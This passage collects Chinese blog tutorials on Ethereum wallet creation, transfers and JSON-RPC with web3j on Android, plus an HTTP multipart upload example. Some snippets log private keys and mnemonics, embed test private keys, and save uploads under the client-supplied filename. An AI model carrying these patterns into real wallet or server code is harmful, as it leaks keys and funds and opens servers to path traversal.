1234WalletUtils.generateFullNewWalletFile();WalletUtils.generateLightNewWalletFile();WalletUtils.generateNewWalletFile();WalletUtils.generateWalletFile(); generateFullNewWalletFile 使用N_STANDARD加密强度，在Android上会发送OOM，Android的处理速度也跟不上。 generateLightNewWalletFile 相对来说比较轻量级，但是在我手机（红米4）上也花了21秒才创建完成，而加载为 Credentials 花了40秒。而在一台三星手机跑比较快，7秒左右。 12345678910111213141516171819202122232425262728293031323334public void startClickCreateDefault(View view) &#123; try &#123; String password = \"123456\"; String path = Environment.getExternalStorageDirectory().getPath() + \"/MyWallet\"; File fileDir = new File(path); if (!fileDir.exists()) &#123; fileDir.mkdirs(); &#125; //生成钱包身份保存到目录下 String fileName = null; Log.e(TAG, \"startClickCreateDefault: \"+fileDir.getPath() ); fileName = WalletUtils.generateLightNewWalletFile(\"123456\",fileDir); Log.e(TAG, \"wallet fileName: \" + fileName ); //加载钱包身份 Credentials credentials = WalletUtils.loadCredentials(password,path + \"/\" +fileName); Log.e(TAG, \"getAddress: \"+credentials.getAddress()); Log.e(TAG, \"getPrivateKey: \"+credentials.getEcKeyPair().getPrivateKey()); Log.e(TAG, \"getPublicKey: \"+credentials.getEcKeyPair().getPublicKey()); &#125; catch (NoSuchAlgorithmException e) &#123; e.printStackTrace(); &#125; catch (NoSuchProviderException e) &#123; e.printStackTrace(); &#125; catch (InvalidAlgorithmParameterException e) &#123; e.printStackTrace(); &#125; catch (CipherException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;&#125; 创建BIP39身份可以导出助记词，创建花了43秒，用助记词导入很快，只花了几秒。 1WalletUtils.generateBip39Wallet(); WalletUtils提供的这个方法在Android上闪退，只有自己写一个了 1234567891011121314151617181920212223242526272829303132333435363738394041424344public void startClickCreateBip39(View view)&#123; String password = \"123456\"; String path = Environment.getExternalStorageDirectory().getPath() + \"/MyWallet\"; File fileDir = new File(path); if (!fileDir.exists()) &#123; fileDir.mkdirs(); &#125; Log.e(TAG, \"wallet start\"); //闪退 //Bip39Wallet wallet = WalletUtils.generateBip39Wallet(password,fileDir); //String mnemonic = wallet.getMnemonic(); //Log.e(TAG, \"助记词wallet.getMnemonic(): \" + mnemonic); //String fileName = wallet.getFilename(); //Log.e(TAG, \"fileName: \" + fileName); try &#123; StringBuilder sb = new StringBuilder(); byte[] entropy = new byte[Words.TWELVE.byteLength()]; new SecureRandom().nextBytes(entropy); new MnemonicGenerator(English.INSTANCE).createMnemonic(entropy, sb::append); String mnemonic = sb.toString(); //String mnemonic = MnemonicUtils.generateMnemonic(initialEntropy); byte[] seed = MnemonicUtils.generateSeed(mnemonic, password); ECKeyPair privateKey = ECKeyPair.create(sha256(seed)); String fileName = WalletUtils.generateWalletFile(password, privateKey, fileDir, false); Log.e(TAG, \"fileName: \" + fileName); Log.e(TAG, \"助记词wallet.getMnemonic(): \" + mnemonic); //加载钱包身份 Credentials credentials = WalletUtils.loadBip39Credentials(password,mnemonic); Log.e(TAG, \"getAddress: \"+credentials.getAddress()); Log.e(TAG, \"getPrivateKey: \"+credentials.getEcKeyPair().getPrivateKey()); Log.e(TAG, \"getPublicKey: \"+credentials.getEcKeyPair().getPublicKey()); &#125; catch (CipherException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125;&#125; Android创建钱包上面这些感觉比较适合Java程序，我们跳进去看看就知道了，其实生成数字身份的代码是： 1234public static WalletFile createLight(String password, ECKeyPair ecKeyPair) throws CipherException &#123; return create(password, ecKeyPair, N_LIGHT, P_LIGHT);&#125; 针对Android，我们需要将生成的数字身份 WalletFile 转为 JSON (Keystore)保存到 SharedPreferences ，所以整理一个工具类： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101import android.support.annotation.Nullable;import android.util.Log;import org.web3j.crypto.CipherException;import org.web3j.crypto.Credentials;import org.web3j.crypto.ECKeyPair;import org.web3j.crypto.Keys;import org.web3j.crypto.MnemonicUtils;import org.web3j.crypto.Wallet;import org.web3j.crypto.WalletFile;import java.io.IOException;import java.security.InvalidAlgorithmParameterException;import java.security.NoSuchAlgorithmException;import java.security.NoSuchProviderException;import java.security.SecureRandom;import io.github.novacrypto.bip39.MnemonicGenerator;import io.github.novacrypto.bip39.Words;import io.github.novacrypto.bip39.wordlists.English;import static org.web3j.crypto.Hash.sha256;public class MyWalletTool &#123; private final String TAG = getClass().getName(); /** * 创建一个轻量级钱包，没有助记词 * @param password * @return */ public WalletFile createLightWallet(String password)&#123; WalletFile walletFile = null; try &#123; walletFile = Wallet.createLight(password, Keys.createEcKeyPair()); &#125; catch (CipherException | NoSuchProviderException | NoSuchAlgorithmException | InvalidAlgorithmParameterException e) &#123; e.printStackTrace(); &#125; return walletFile; &#125; /** * 创建一个助记词 * @return */ public String createMnemonic()&#123; StringBuilder sb = new StringBuilder(); byte[] entropy = new byte[Words.TWELVE.byteLength()]; new SecureRandom().nextBytes(entropy); new MnemonicGenerator(English.INSTANCE).createMnemonic(entropy, sb::append); return sb.toString(); &#125; /** * 创建一个带有助记词的轻量级钱包 * @param password * @param mnemonic * @return */ @Nullable public WalletFile createBip39Wallet(String password,String mnemonic)&#123; WalletFile walletFile = null; try &#123; byte[] seed = MnemonicUtils.generateSeed(mnemonic, password); Log.d(TAG, \"createLight start...\"); walletFile = Wallet.createLight(password, ECKeyPair.create(sha256(seed))); Log.d(TAG, \"createLight end.\"); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; return walletFile; &#125; /** * 生成凭证 * @param password * @param walletFile * @return * @throws CipherException */ public Credentials createCredentials(String password,String mnemonic)&#123; byte[] seed = MnemonicUtils.generateSeed(mnemonic, password); return Credentials.create(ECKeyPair.create(sha256(seed))); &#125; public Credentials createCredentials(String password,WalletFile walletFile) throws CipherException &#123; return Credentials.create(Wallet.decrypt(password, walletFile)); &#125; public Credentials createCredentials(String privateKey) &#123; return Credentials.create(privateKey); &#125; 交易凭证Credentials在 web3j 中每一个交易都需要一个参数：Credentials，Credentials 实例化有三种方法，其中私钥权限最高，所以绝不能泄露自己的私钥和助记词，常用的是密码 + Keystore。 从MyWalletTool调用的函数来看，交易凭证的实例化只需要以下之一： 私钥 助记词 密码 + Keystore 私钥 一个钱包只有一个私钥且不能修改 为什么 私钥 单独可以实现实例化 Credentials ？ Credentials 的构造函数参数是 ECKeyPair 和 address 1234private Credentials(ECKeyPair ecKeyPair, String address) &#123; this.ecKeyPair = ecKeyPair; this.address = address;&#125; address 可以通过 ECKeyPair 推导出来，而 ECKeyPair 的构造函数参数就是公钥和私钥 1234public ECKeyPair(BigInteger privateKey, BigInteger publicKey) &#123; this.privateKey = privateKey; this.publicKey = publicKey;&#125; 公钥可以通过私钥推导出来，所以可以直接实例化 Credentials。1Sign.publicKeyFromPrivate(privateKey) 助记词 助记词是明文私钥的另一种表现形式，其目的是为了帮助用户记忆复杂的私钥 Canache生成的一个助记词123助记词:jump dolphin leave reward allow farm gate hospital region diary seminar loan地址:0x7E728c371D66813434F340E6D473B212F506bA54私钥:6229413033912ab1f26e36f0aad7e1ea2b957de73cfedf788b9fff811192aa89 用 imToken 可以成功导入钱包，但是用下面的 BIP39 标准的代码却不行(passphrase是加盐，这里为空)。 1234byte[] seed = MnemonicUtils.generateSeed(mnemonic, passphrase);//passphrase=nullECKeyPair ecKeyPair = ECKeyPair.create(sha256(seed));System.out.println(\"private=\" + ecKeyPair.getPrivateKey().toString());System.out.println(\"private=\" + ecKeyPair.getPrivateKey().toString(16)); 结果是:12private=27538423023524426157929608133615570842335693203949154557762660148101331275721private=3ce231f097447fe5d623b3a1f9a37e8c554ee014959903c4e2ebadf69ac7cfc9 网上查资料说 imToken 用的是 BIP44 标准。后面再看看怎么搞，imToken核心码开源地址 BIP44助记词创建和导入 Keystore 将私钥以加密的方式保存为一份 JSON 文件，这份 JSON 文件就是 Keystore，所以它就是加密后的私钥，它必须配合钱包密码才能使用该账号。 1ECKeyPair ecKeyPair = Wallet.decrypt(password, walletFile); 钱包开源项目 A ethereum wallet like imToken for Android A beautiful, secure and native Ethereum Wallet for Android Lightweight JS Wallet for Node and the browser A plugin that turns Vault into an Ethereum wallet. Golang","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"13、Android通过web3j交易代币","slug":"区块链/13、Android通过web3j交易代币","date":"2018-12-27T15:52:36.000Z","updated":"2018-12-27T15:52:36.000Z","comments":true,"path":"区块链/13、Android通过web3j交易代币/","link":"","permalink":"http://yoursite.com/区块链/13、Android通过web3j交易代币/","excerpt":"","text":"测试“生成合约的Java代码”环境下载web3j-3.4.0解压目录 12345.├── bin│ ├── web3j│ └── web3j.bat└── lib 进入bin目录，编写一个测试合约代码 SimpleStorage.sol 1234567891011pragma solidity ^0.4.17;contract SimpleStorage &#123; uint storedData; function set(uint x) public &#123; storedData = x; &#125; function get() public view returns (uint) &#123; return storedData; &#125;&#125; 执行以下命令 1234$ npm install -g solc@0.4.17$ solcjs SimpleStorage.sol --optimize --bin --abi$ ./web3j solidity generate SimpleStorage_sol_SimpleStorage.bin SimpleStorage_sol_SimpleStorage.abi -o ./ -p com.github.contract 如果生成成功的话，在目录下就有代码文件了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package com.github.contract;import java.math.BigInteger;import java.util.Arrays;import java.util.Collections;import org.web3j.abi.TypeReference;import org.web3j.abi.datatypes.Function;import org.web3j.abi.datatypes.Type;import org.web3j.abi.datatypes.generated.Uint256;import org.web3j.crypto.Credentials;import org.web3j.protocol.Web3j;import org.web3j.protocol.core.RemoteCall;import org.web3j.protocol.core.methods.response.TransactionReceipt;import org.web3j.tx.Contract;import org.web3j.tx.TransactionManager;/** * &lt;p&gt;Auto generated code. * &lt;p&gt;&lt;strong&gt;Do not modify!&lt;/strong&gt; * &lt;p&gt;Please use the &lt;a href=\"https://docs.web3j.io/command_line.html\"&gt;web3j command line tools&lt;/a&gt;, * or the org.web3j.codegen.SolidityFunctionWrapperGenerator in the * &lt;a href=\"https://github.com/web3j/web3j/tree/master/codegen\"&gt;codegen module&lt;/a&gt; to update. * * &lt;p&gt;Generated with web3j version 3.4.0. */public class SimpleStorage_sol_SimpleStorage extends Contract &#123; private static final String BINARY = \"608060405234801561001057600080fd5b5060be8061001f6000396000f3fe6080604052348015600f57600080fd5b5060043610604e577c0100000000000000000000000000000000000000000000000000000000600035046360fe47b1811460535780636d4ce63c14606f575b600080fd5b606d60048036036020811015606757600080fd5b50356087565b005b6075608c565b60408051918252519081900360200190f35b600055565b6000549056fea165627a7a72305820e5e4aaf9332912cc735c414d20ef297bee7a95d95f6c63801cb3c4c94a6542cd0029\"; public static final String FUNC_SET = \"set\"; public static final String FUNC_GET = \"get\"; protected SimpleStorage_sol_SimpleStorage(String contractAddress, Web3j web3j, Credentials credentials, BigInteger gasPrice, BigInteger gasLimit) &#123; super(BINARY, contractAddress, web3j, credentials, gasPrice, gasLimit); &#125; protected SimpleStorage_sol_SimpleStorage(String contractAddress, Web3j web3j, TransactionManager transactionManager, BigInteger gasPrice, BigInteger gasLimit) &#123; super(BINARY, contractAddress, web3j, transactionManager, gasPrice, gasLimit); &#125; public RemoteCall&lt;TransactionReceipt&gt; set(BigInteger x) &#123; final Function function = new Function( FUNC_SET, Arrays.&lt;Type&gt;asList(new org.web3j.abi.datatypes.generated.Uint256(x)), Collections.&lt;TypeReference&lt;?&gt;&gt;emptyList()); return executeRemoteCallTransaction(function); &#125; public RemoteCall&lt;BigInteger&gt; get() &#123; final Function function = new Function(FUNC_GET, Arrays.&lt;Type&gt;asList(), Arrays.&lt;TypeReference&lt;?&gt;&gt;asList(new TypeReference&lt;Uint256&gt;() &#123;&#125;)); return executeRemoteCallSingleValueReturn(function, BigInteger.class); &#125; public static RemoteCall&lt;SimpleStorage_sol_SimpleStorage&gt; deploy(Web3j web3j, Credentials credentials, BigInteger gasPrice, BigInteger gasLimit) &#123; return deployRemoteCall(SimpleStorage_sol_SimpleStorage.class, web3j, credentials, gasPrice, gasLimit, BINARY, \"\"); &#125; public static RemoteCall&lt;SimpleStorage_sol_SimpleStorage&gt; deploy(Web3j web3j, TransactionManager transactionManager, BigInteger gasPrice, BigInteger gasLimit) &#123; return deployRemoteCall(SimpleStorage_sol_SimpleStorage.class, web3j, transactionManager, gasPrice, gasLimit, BINARY, \"\"); &#125; public static SimpleStorage_sol_SimpleStorage load(String contractAddress, Web3j web3j, Credentials credentials, BigInteger gasPrice, BigInteger gasLimit) &#123; return new SimpleStorage_sol_SimpleStorage(contractAddress, web3j, credentials, gasPrice, gasLimit); &#125; public static SimpleStorage_sol_SimpleStorage load(String contractAddress, Web3j web3j, TransactionManager transactionManager, BigInteger gasPrice, BigInteger gasLimit) &#123; return new SimpleStorage_sol_SimpleStorage(contractAddress, web3j, transactionManager, gasPrice, gasLimit); &#125;&#125; 生成合约Java代码确定环境搭建好了之后，就可以将我们的合约进行生成Java代码了 进入合约的目录，执行命令生成bin和abi文件 1234567.├── Migrations.sol├── StandardToken.sol├── TeaToken.sol└── Token.sol$ solcjs *.sol --optimize --bin --abi 为了减少路径的输入，我把所有的bin和abi文件拷贝到web3j目录下 12345678910111213141516171819202122232425262728293031323334353637383940$ cd web3j-3.4.0/bin$ tree.├── Migrations_sol_Migrations.abi├── Migrations_sol_Migrations.bin├── StandardToken_sol_StandardToken.abi├── StandardToken_sol_StandardToken.bin├── TeaToken_sol_TeaToken.abi├── TeaToken_sol_TeaToken.bin├── Token_sol_Token.abi├── Token_sol_Token.bin├── web3j└── web3j.bat$ ./web3j solidity generate TeaToken_sol_TeaToken.bin TeaToken_sol_TeaToken.abi -o ./ -p com.github.contract _ _____ _ _ | | |____ (_) (_)__ _____| |__ / /_ _ ___\\ \\ /\\ / / _ \\ '_ \\ \\ \\ | | | / _ \\ \\ V V / __/ |_) |.___/ / | _ | || (_) | \\_/\\_/ \\___|_.__/ \\____/| |(_)|_| \\___/ _/ | |__/Generating com.github.contract.TeaToken_sol_TeaToken ... File written to ..├── com│ └── github│ └── contract│ └── TeaToken_sol_TeaToken.java├── Migrations_sol_Migrations.abi├── Migrations_sol_Migrations.bin├── StandardToken_sol_StandardToken.abi├── StandardToken_sol_StandardToken.bin├── TeaToken_sol_TeaToken.abi├── TeaToken_sol_TeaToken.bin├── Token_sol_Token.abi├── Token_sol_Token.bin├── web3j└── web3j.bat 将生成的 TeaToken_sol_TeaToken.java 拷贝到Android项目 调用合约代码注意：合约要预先部署好，下面这是在Java、Android上部署合约的代码，一般不会再Android App上部署合约，可以用Java程序或者truffle来部署合约。 部署合约的账号拥有所有的代币，可以通过转账发给其他账户。 1TeaToken_sol_TeaToken contract = TeaToken_sol_TeaToken.deploy(web3j, credentials1, GAS_PRICE, GAS_LIMIT).send(); 代码 1234567891011121314151617181920212223242526272829public void testTransferSmartContracts() throws ExecutionException, InterruptedException &#123; //合约地址 final String contractAddress = \"0x6bee29c36f1633db9c4dfb4e445fccd8c4dd8023\"; EthCoinbase coinbase = web3j.ethCoinbase().sendAsync().get(); final String coinbaseAddress = coinbase.getAddress(); final String formKey = \"58e7f34b59a828d1dc37a97a921b55de0cb8cedea91b1e09b490f39264b151ce\"; //签名 Credentials credentials = Credentials.create(formKey); //收款地址 final String toAddress = \"0x9958eC47C8286DC89F5CbCbD842458bD43540a7D\"; //通过合约地址加载合约 TeaToken_sol_TeaToken contract = TeaToken_sol_TeaToken.load(contractAddress,web3j,credentials,GAS_PRICE, GAS_LIMIT); BigInteger totalSupply = contract.totalSupply().sendAsync().get(); Log.e(TAG, \"totalSupply = \"+ totalSupply ); BigInteger balanceOf = contract.balanceOf(coinbaseAddress).sendAsync().get(); Log.e(TAG, \"balanceOf = \"+ balanceOf ); TransactionReceipt transactionReceipt = contract.transfer(toAddress,new BigInteger(\"10000000000000000000\")).sendAsync().get(); Log.e(TAG, \"Status = \"+transactionReceipt.getStatus()); Log.e(TAG, \"GasUsed = \"+transactionReceipt.getGasUsed()); Log.e(TAG, \"TransactionHash = \"+transactionReceipt.getTransactionHash()); Log.e(TAG, \"BlockHash = \"+transactionReceipt.getBlockHash()); Log.e(TAG, \"BlockNumberRaw = \"+transactionReceipt.getBlockNumberRaw()); Log.e(TAG, \"BlockNumber = \"+transactionReceipt.getBlockNumber()); &#125; 运行Android日志 12345678totalSupply = 10000000000000000000000balanceOf = 10000000000000000000000Status = 0x1GasUsed = 51511TransactionHash = 0x9389ffcc09dd8d17023e49f5487b95e41ff537a83282a85abc606da7ab99d37cBlockHash = 0x1447cbd6e36dca635a5cce39d35d3cafc7bd3b6b57d53fc338968b14c172019eBlockNumberRaw = 0x7BlockNumber = 7 运行Canache日志 12345[上午11:08:06] Transaction: 0x9389ffcc09dd8d17023e49f5487b95e41ff537a83282a85abc606da7ab99d37c[上午11:08:06] Gas usage: 51511[上午11:08:06] Block Number: 7[上午11:08:06] Block Time: Sat Dec 29 2018 11:08:06 GMT+0800 (中国标准时间)[上午11:08:06] eth_getTransactionReceipt 好了，后续的功能一样的，可以查询账号余额等。","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"12、Android通过web3j交易以太坊币","slug":"区块链/12、Android通过web3j交易以太坊币","date":"2018-12-27T14:52:36.000Z","updated":"2018-12-27T14:52:36.000Z","comments":true,"path":"区块链/12、Android通过web3j交易以太坊币/","link":"","permalink":"http://yoursite.com/区块链/12、Android通过web3j交易以太坊币/","excerpt":"","text":"为了防止交易重复进行，以太坊要求每笔交易必须有一个nonce数值。nonce值从0开始递增，每发送一笔交易，nonce便加1。 交易处理从nonce值较小的开始，所以nonce的值太大的话，交易会被延迟处理。 如何合理的获取nonce的值：向以太坊节点获取。 示例代码 12345678910111213141516171819202122232425262728293031323334/** * 以太坊交易 * @throws ExecutionException * @throws InterruptedException */ public void testTransferEther() throws ExecutionException, InterruptedException &#123; EthCoinbase coinbase = web3j.ethCoinbase().sendAsync().get(); //拨款地址，这里用coinbase账号的地址 final String formAddress = coinbase.getAddress(); //拨款账号的Key，Key是账号的身份验证，很重要 final String formKey = \"58e7f34b59a828d1dc37a97a921b55de0cb8cedea91b1e09b490f39264b151ce\"; //收款地址 final String toAddress = \"0x9958eC47C8286DC89F5CbCbD842458bD43540a7D\"; EthGetTransactionCount ethGetTransactionCount = web3j.ethGetTransactionCount( formAddress, DefaultBlockParameterName.LATEST).sendAsync().get(); BigInteger nonce = ethGetTransactionCount.getTransactionCount(); //转0.5个以太坊币 BigInteger value = Convert.toWei(\"0.5\", Convert.Unit.ETHER).toBigInteger(); Log.e(TAG, \"transaction nonce: \" + nonce ); RawTransaction rawTransaction = RawTransaction.createEtherTransaction( nonce, GAS_PRICE, GAS_LIMIT, toAddress, value); //签名 Credentials credentials = Credentials.create(formKey); byte[] signedMessage = TransactionEncoder.signMessage(rawTransaction, credentials); String hexValue = Numeric.toHexString(signedMessage); //交易 EthSendTransaction ethSendTransaction = web3j.ethSendRawTransaction(hexValue).sendAsync().get(); Log.e(TAG, \"transactionHash: \" + ethSendTransaction.getTransactionHash()); &#125; 参考： 以太坊实战之《如何正确处理nonce》","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"11、JSON-RPC","slug":"区块链/11、JSON-RPC","date":"2018-12-27T13:52:36.000Z","updated":"2018-12-27T13:52:36.000Z","comments":true,"path":"区块链/11、JSON-RPC/","link":"","permalink":"http://yoursite.com/区块链/11、JSON-RPC/","excerpt":"","text":"我们使用 Js / Java / Go 等语言调用以太坊 ethereum 的服务时，以太坊是通过 JSON-RPC 提供服务的，那么什么是 JSON-RPC ? JSON-RPC JSON-RPC是一种无状态轻量级远程过程调用（RPC）协议。本规范定义了数据结构及 相应的处理规则。规范本身是传输无关的，可以用于进程内通信、Socket套接字、HTTP 或各种消息通信环境。规范使用JSON（RFC 4627）数据格式。 相较于一般的 RESTAPI 通过网址（如 GET /user）调用远程服务器，JSON-RPC 直接在内容中定义了欲调用的函数名称，如 {“method”: “getUser”}，JSON-RPC 更加简单和轻量级。 眼下主流语言都已有 JSON-RPC 的实现框架，Java语言中较好的JSON-RPC实现框架有 jsonrpc4j、jpoxy、json-rpc。三者之中 jsonrpc4j 既可独立使用。又可与 spring 无缝集合，比較适合于基于 spring的项目开发。 Ethereum JSON-RPCethereum 的 JSON-RPC 是通过HTTP传输的，所以查询 web3_clientVersion 可以通过以下命令： 123456789// Requestcurl -X POST --data '&#123;\"jsonrpc\":\"2.0\",\"method\":\"web3_clientVersion\",\"params\":[],\"id\":67&#125;'// Result&#123; \"id\":67, \"jsonrpc\":\"2.0\", \"result\": \"Mist/v0.9.3/darwin/go1.4.1\"&#125; webj 就和 web3.js 等库是对 JSON-RPC 进行封装，方便开发者使用，文档 。 JSON-RPC 和 REST 的区别JSON-RPC 在平时开发Web应用时，可以采用 JSON-RPC ，也可以采用 REST 。 他们各有自己的特点，没有高低之分，只是约定俗成的标准， REST偏向外部调用，JSON-RPC 偏向内部调用采用。 RPC 的思想是把本地函数映射到API，也就是说一个API对应的是一个function，对传输协议没有限制，可以是TCP Socket或者HTTP。 REST 则不然，它的URL主体是资源，是个名词。仅支持HTTP协议，使用HTTP Method表达动作，类型只有四五种。 《使用golang 实现 JSON-RPC2.0》 《JSON-RPC轻量级远程调用协议介绍及使用》","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"参考web3j的响应类定义","slug":"Java/参考web3j的响应类定义","date":"2018-12-27T11:52:36.000Z","updated":"2018-12-27T11:52:36.000Z","comments":true,"path":"Java/参考web3j的响应类定义/","link":"","permalink":"http://yoursite.com/Java/参考web3j的响应类定义/","excerpt":"","text":"平时写Android App和Web服务器的通讯是通过JSON的数据格式，然而自己对响应数据的定义的一般是使用Java Bean的继承来实现，下面是web3j的设计，也差不多这样，但是他的泛型用的挺的，以后可以参考。 比如：123456789101112package org.web3j.protocol.core.methods.response;import org.web3j.protocol.core.Response;/** * eth_coinbase. */public class EthCoinbase extends Response&lt;String&gt; &#123; public String getAddress() &#123; return getResult(); &#125;&#125; Response类的 result 字段使用了泛型 T :123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131package org.web3j.protocol.core;import com.fasterxml.jackson.annotation.JsonIgnoreProperties;/** * Our common JSON-RPC response type. * * @param &lt;T&gt; the object type contained within the response */@JsonIgnoreProperties(ignoreUnknown = true)public class Response&lt;T&gt; &#123; private long id; private String jsonrpc; private T result; private Error error; private String rawResponse; public Response() &#123; &#125; public long getId() &#123; return id; &#125; public void setId(long id) &#123; this.id = id; &#125; public String getJsonrpc() &#123; return jsonrpc; &#125; public void setJsonrpc(String jsonrpc) &#123; this.jsonrpc = jsonrpc; &#125; public T getResult() &#123; return result; &#125; public void setResult(T result) &#123; this.result = result; &#125; public Error getError() &#123; return error; &#125; public void setError(Error error) &#123; this.error = error; &#125; public boolean hasError() &#123; return error != null; &#125; public String getRawResponse() &#123; return rawResponse; &#125; public void setRawResponse(String rawResponse) &#123; this.rawResponse = rawResponse; &#125; public static class Error &#123; private int code; private String message; private String data; public Error() &#123; &#125; public Error(int code, String message) &#123; this.code = code; this.message = message; &#125; public int getCode() &#123; return code; &#125; public void setCode(int code) &#123; this.code = code; &#125; public String getMessage() &#123; return message; &#125; public void setMessage(String message) &#123; this.message = message; &#125; public String getData() &#123; return data; &#125; public void setData(String data) &#123; this.data = data; &#125; @Override public boolean equals(Object o) &#123; if (this == o) &#123; return true; &#125; if (!(o instanceof Error)) &#123; return false; &#125; Error error = (Error) o; if (getCode() != error.getCode()) &#123; return false; &#125; if (getMessage() != null ? !getMessage().equals(error.getMessage()) : error.getMessage() != null) &#123; return false; &#125; return getData() != null ? getData().equals(error.getData()) : error.getData() == null; &#125; @Override public int hashCode() &#123; int result = getCode(); result = 31 * result + (getMessage() != null ? getMessage().hashCode() : 0); result = 31 * result + (getData() != null ? getData().hashCode() : 0); return result; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"10、Android调用web3j接口查询余额","slug":"区块链/10、Android调用web3j接口查询余额","date":"2018-12-26T13:52:36.000Z","updated":"2018-12-26T14:40:00.000Z","comments":true,"path":"区块链/10、Android调用web3j接口查询余额/","link":"","permalink":"http://yoursite.com/区块链/10、Android调用web3j接口查询余额/","excerpt":"","text":"启动 ganache-gui打开就可以了，设置一下HOSTNAME API1implementation ('org.web3j:core:3.3.1-android') 这个库完全实现了以太坊的 Json-RPC 客户端的协议，包含HTTP和IPC，我们就用HTTP的就可以了， Documentation 。 代码直接贴 Web3j 的代码 123456789101112131415161718192021222324252627public void test()&#123; Web3j web3 = Web3jFactory.build(new HttpService(\"http://192.168.0.92:7545\")); try &#123; Web3ClientVersion web3ClientVersion = web3.web3ClientVersion().sendAsync().get(); String clientVersion = web3ClientVersion.getWeb3ClientVersion(); Log.e(TAG, \"clientVersion: \"+clientVersion); EthCoinbase coinbase = web3.ethCoinbase().sendAsync().get(); String address = coinbase.getAddress(); Log.e(TAG, \"coinbase address: \" + address ); EthBlockNumber blockNumber = web3.ethBlockNumber().sendAsync().get(); Log.e(TAG, \"BlockNumber: \"+blockNumber.getBlockNumber() ); BigInteger balance = web3.ethGetBalance(address, DefaultBlockParameterName.LATEST).sendAsync().get().getBalance(); Log.e(TAG, \"balance :\" + balance.toString()); Log.e(TAG, \"balance getLowestSetBit:\" + balance.getLowestSetBit()); Log.e(TAG, \"balance longValue:\" + balance.longValue()); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; catch (ExecutionException e) &#123; e.printStackTrace(); &#125;&#125;","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"深入解析HTTP--Multipart","slug":"前端/深入解析HTTP--Multipart","date":"2018-12-21T12:52:36.000Z","updated":"2021-12-28T03:24:10.260Z","comments":true,"path":"前端/深入解析HTTP--Multipart/","link":"","permalink":"http://yoursite.com/前端/深入解析HTTP--Multipart/","excerpt":"","text":"描述multipart/form-data 用以向服务器发送二进制数据，一般用于多个文件和参数一起发送。 服务端接收数据1234567891011121314151617181920212223242526@RequestMapping(\"/test/multipart\")@ResponseBodypublic String handleFileUpload(@RequestPart(\"file\")MultipartFile file, @RequestPart(\"describe\")String describe)&#123; System.out.println(\"describe=\"+describe); if(!file.isEmpty())&#123; try &#123; BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(new File(file.getOriginalFilename()))); out.write(file.getBytes()); out.flush(); out.close(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); return e.getMessage(); &#125; catch (IOException e) &#123; e.printStackTrace(); return e.getMessage(); &#125; return\"OK\"; &#125;else&#123; return\"file is null\"; &#125;&#125; 客户端 每一个文件或者参数做为一个Part Part 都包含头信息部分 Part 头信息中必须包含一个 Content-Disposition 头，其他的头信息则为可选项， 比如 Content-Type 等 每个 Part 使用 --boundary 分割，最后一行使用 --boundary-- 结尾 举例： 发送一个请求，为了方便，这里上传一个txt文件 hello.txt 和一个参数 describe，二进制文件比如图片，直接发它的byte就可以了。 postman发送如图： postman请求发送的数据（每一行结尾都有一个 CRLF，空行也是有 CRLF）： 123456789101112131415161718192021222324252627POST /test/multipart HTTP/1.1cache-control: no-cachePostman-Token: 8adf3cf7-6779-4273-ba5a-8b8a42103a02User-Agent: PostmanRuntime/7.4.0Accept: */*Host: 127.0.0.1:7878accept-encoding: gzip, deflatecontent-type: multipart/form-data; boundary=--------------------------443008154012991210048296content-length: 331Connection: keep-alive----------------------------443008154012991210048296Content-Disposition: form-data; name=\"file\"; filename=\"hello.txt\"Content-Type: text/plain12345----------------------------443008154012991210048296Content-Disposition: form-data; name=\"describe\"this is text----------------------------443008154012991210048296--HTTP/1.1 200 Content-Type: text/plain;charset=UTF-8Content-Length: 2Date: Sat, 22 Dec 2018 09:38:14 GMTOK 原始数据：123504f5354202f746573742f6d756c74697061727420485454502f312e310d0a63616368652d636f6e74726f6c3a206e6f2d63616368650d0a506f73746d616e2d546f6b656e3a2038616466336366372d363737392d343237332d626135612d3862386134323130336130320d0a557365722d4167656e743a20506f73746d616e52756e74696d652f372e342e300d0a4163636570743a202a2f2a0d0a486f73743a203132302e37392e34332e34343a373837380d0a6163636570742d656e636f64696e673a20677a69702c206465666c6174650d0a636f6e74656e742d747970653a206d756c7469706172742f666f726d2d646174613b20626f756e646172793d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d3434333030383135343031323939313231303034383239360d0a636f6e74656e742d6c656e6774683a203333310d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d3434333030383135343031323939313231303034383239360d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d2268656c6c6f2e747874220d0a436f